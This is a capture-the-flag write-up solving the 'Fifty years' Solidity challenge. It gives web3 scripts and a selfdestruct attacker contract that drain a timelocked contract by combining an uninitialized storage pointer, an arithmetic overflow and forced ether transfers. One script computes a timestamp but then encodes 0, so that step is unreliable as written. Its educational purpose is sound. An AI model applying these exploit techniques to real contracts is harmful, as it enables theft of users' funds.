# 14. Fifty years

This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later.

All you have to do to complete this challenge is wait 50 years and withdraw the ether. If you’re not that patient, you’ll need to combine several techniques to hack this contract.

## Target contract

```solidity
pragma solidity ^0.4.21;

contract FiftyYearsChallenge {
    struct Contribution {
        uint256 amount;
        uint256 unlockTimestamp;
    }
    Contribution[] queue;
    uint256 head;

    address owner;
    function FiftyYearsChallenge(address player) public payable {
        require(msg.value == 1 ether);

        owner = player;
        queue.push(Contribution(msg.value, now + 50 years));
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function upsert(uint256 index, uint256 timestamp) public payable {
        require(msg.sender == owner);

        if (index >= head && index < queue.length) {
            // Update existing contribution amount without updating timestamp.
            Contribution storage contribution = queue[index];
            contribution.amount += msg.value;
        } else {
            // Append a new contribution. Require that each contribution unlock
            // at least 1 day after the previous one.
            require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);

            contribution.amount = msg.value;
            contribution.unlockTimestamp = timestamp;
            queue.push(contribution);
        }
    }

    function withdraw(uint256 index) public {
        require(msg.sender == owner);
        require(now >= queue[index].unlockTimestamp);

        // Withdraw this and any earlier contributions.
        uint256 total = 0;
        for (uint256 i = head; i <= index; i++) {
            total += queue[i].amount;

            // Reclaim storage.
            delete queue[i];
        }

        // Move the head of the queue forward so we don't have to loop over
        // already-withdrawn contributions.
        head = index + 1;

        msg.sender.transfer(total);
    }
}
```

## Vulnerability

This contract is more complex than previous ones. Just to be clear, we are already owner of the contract :

```js
const challengeContract = "0x6Ce2071eca50AC47fcEEBE4936Fa4d5b93Ab5786";

console.log(await web3.eth.getStorageAt(challengeContract, 2));
// 0x000000000000000000000000YOUR-ADDRESS-IS-HERE
```

So we should focus on bypassing the timelock of 50 years. You might notice something strange in `upsert` :

```solidity
   function upsert(uint256 index, uint256 timestamp) public payable {
        require(msg.sender == owner);

        if (index >= head && index < queue.length) {
            // Update existing contribution amount without updating timestamp.
            Contribution storage contribution = queue[index];
            contribution.amount += msg.value;
        } else {
            // Append a new contribution. Require that each contribution unlock
            // at least 1 day after the previous one.
            require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);

            contribution.amount = msg.value;
            contribution.unlockTimestamp = timestamp;
            queue.push(contribution);
        }
    }
```

As the `if` block declares and initializes storage variable `contribution`, and the `else` block uses it... If it's used in the `else` block, it means that we did not validate the `if` block and therefore it is uninitialized. This is a very odd (and terrible) behavior from solidity < 0.5.0 that was solved with the release of 0.5.0 : "Code Generator: Allocate and free local variables according to their scope.".

So, similarly to the previous challenge we can make use of that uninitialized pointer to rewrite storage how we see fit where :

```solidity
// Will overwrite storage slot 0 : queue.length
contribution.amount = msg.value;
// Will overwrite storage slot 1 : head
contribution.unlockTimestamp = timestamp;
```

Since `timestamp` will overwrite the `head` storage variable we must think ahead to how we will withdraw later on... To withdraw each donation we must set `head` to 0 and give the appropriate `index` to `withdraw`, but adding a donation by relying on the uninitialized storage pointer will set `head` to `timestamp` which is far greater than 0.

We can rely on the fact that `queue[queue.length - 1].unlockTimestamp + 1 days` is another example of unchecked arithmetic. If we initially give a timestamp value close to `2^256 - 1` the next contribution will execute that line again and overflow... If we find the right values to overflow and loop back to 0 we (almost) have a way of reseting `head` to the value that allows us to move forward with a withdrawal.

So first, we send a contribution with an `index` > 1 to force an append, a `msg.value` of 1 to avoid interfering with the actual `queue.length` and a `timestamp` of `2^256 - 1 days` to setup an overflow on the contribution that we will do after that one : 

```js
const challengeContract = "0x058de915E68b8beef52dC9463fef1cD97a51717b";

// 2 ^ 256 - 1 days : next contribution will overflow on queue[queue.length - 1].unlockTimestamp + 1 days
const timestamp = web3.utils
  .toBN("0x10000000000000000000000000000000000000000000000000000000000000000")
  .sub(new web3.utils.BN("86400"));

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "upsert",
    type: "function",
    inputs: [
      { type: "uint256", name: "index" },
      { type: "uint256", name: "timestamp" },
    ],
  },
  [2, 0] // index must be > 1 to append a new contribution
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: challengeContract,
  data: data,
  value: 1, // don't change initial queue.length
});
```

We can now reset the `head` variable through an overflow by sending a new contribution with an `index` of 3 to force an append, a `msg.value` of 2 to avoid interfering with `queue.length` once again and a `timestamp` of 0. Internally `require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);` will be true as `queue[queue.length - 1].unlockTimestamp` is `2^256 - 1 days`, if we add 1 days to that value it's obviously 2^256 which cannot fit on a 256 bit value, overflows and loops back to the value 0, thus, reseting `head` to 0 by means of the uninitialized storage pointer.

```js
const challengeContract = "0x058de915E68b8beef52dC9463fef1cD97a51717b";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "upsert",
    type: "function",
    inputs: [
      { type: "uint256", name: "index" },
      { type: "uint256", name: "timestamp" },
    ],
  },
  [3, 0] // index must be > 2 to append a new contribution
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: challengeContract,
  data: data,
  value: 2, // don't change queue.length
});
```

If you try to withdraw right away you will find out that it doesn't work and the tx simply reverts. I lost a lot of time on this, more than I should have. The problem is mostly here in the challenge contract :

```solidity
    contribution.amount = msg.value;
    contribution.unlockTimestamp = timestamp;
    queue.push(contribution);
```

 As `contribution.amount` occupies slot 0 or `queue.length`, when we reach `queue.push(contribution)` the size of the array is increased by one, thus increasing `contribution.amount` also as it is also mapped to slot 0. Then the values are copied to the array data storage slots. This means that contribution 2 for which we sent 1 Wei is actually recorded with an `amount` of 2 and contribution 3 for which we sent 2 Wei is recorded with an `amount` of 3... So when we call `withdraw` it tries to send 1 ETH + 2 Wei + 3 Wei while the actual challenge contract balance is 1 ETH + 1 Wei + 2 Wei, which is invalid and therefore reverts.

Trying to solve that issue by interacting with the challenge contract is a dead end... Unless you have close to `2^256 - 1` Wei or more, you could play around an overflow at `contribution.amount += msg.value;` but that's not very realistic. In a previous challenge we did learn a way to force a transfer bypassing every check and limitation : `selfdestruct`. We can use the same technique to increase the contract balance by 2 Wei without interfering with the `queue` and its recorded contributions.

We can build a simple attacker contract : 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    
    address targetContract;

    constructor(address _targetContract) payable {
        require(msg.value == 2, "Send 2 Wei");
        targetContract = _targetContract;
    }

    function attack() public {
        selfdestruct(payable(targetContract));
    }
}
```

Deploy it with 2 Wei and call the `attack` function to force a 2 Wei increase of balance on the target contract : 

```js
const adversarialContract = "0x6E7D4A24Aa0AFE07c60500eb4241348196Fa9800";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "attack",
    type: "function",
    inputs: [],
  },
  []
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: adversarialContract,
  data: data,
});
```

We can finally call withdraw as the `head` and balance are coherent with the `queue` now. Just make sure to call `withdraw` with an index of 2 so that we process contribution 0, 1 and 2 as we must bring the challenge contract's balance to 0 in order to solve the challenge.

```js
const challengeContract = "0x058de915E68b8beef52dC9463fef1cD97a51717b";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "withdraw",
    type: "function",
    inputs: [{ type: "uint256", name: "index" }],
  },
  [2] // withdraw from index 2 : will process donations 0 (1 ETH), 1 (2 Wei) and 2 (3 Wei)
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: challengeContract,
  data: data,
});
```

And submit the challenge ! This one was really fun as we used uninitialized storage pointers, overflows and selfdestruct relying on the challenges that we solved previously.